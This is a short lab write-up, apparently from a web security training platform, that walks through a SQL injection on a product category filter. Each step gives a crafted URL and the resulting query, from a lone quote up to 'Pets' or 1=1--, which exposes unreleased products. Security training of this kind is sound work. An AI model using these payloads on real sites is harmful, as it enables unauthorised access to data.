Analysis:

https://0a0300530485d8d780b1bdd70048001d.web-security-academy.net/filter?category=Pets

Step 1:
Check if the given website as SQL injection vulnerability by adding a ' at the end of the URL string
https://0a0300530485d8d780b1bdd70048001d.web-security-academy.net/filter?category='
Command: SELECT * FROM products WHERE category = ''' AND released = 1
Excecuted Command:  SELECT * FROM products WHERE category = '''
Observation: Internal server error, as the SQL script has error. This reveals the website is prone to SQL injection attacks.

Step 2:
Inject SQL without internal server error
https://0a0300530485d8d780b1bdd70048001d.web-security-academy.net/filter?category='--
Command:  SELECT * FROM products WHERE category = ''--' AND released = 1
Excecuted Command:  SELECT * FROM products WHERE category = ''--
Observation: The website will not show any products since the filter is empty.


Step 3:
Inject SQL without internal server error, with a product category
https://0a0300530485d8d780b1bdd70048001d.web-security-academy.net/filter?category=Pets'--
Command:  SELECT * FROM products WHERE category = 'Pets'--' AND released = 1
Excecuted Command:  SELECT * FROM products WHERE category = 'Pets'--
Observation: The website will show the given filter without any issues as we are commenting out the rest of the SQL clause and syntax errors due to injection


Step 4:
Inject SQL to show all products.
https://0a0300530485d8d780b1bdd70048001d.web-security-academy.net/filter?category=Pets' or 1=1--
Command: SELECT * FROM products WHERE category = 'Pets' or 1=1--' AND released = 1
Excecuted Command: SELECT * FROM products WHERE category = 'Pets' or 1=1--
Observation: Since we don't know if there's a filter to show all categories, we add an TRUE with OR so that where clause is always true regardless
    of the category filter. This will display all products released or unrealeased.
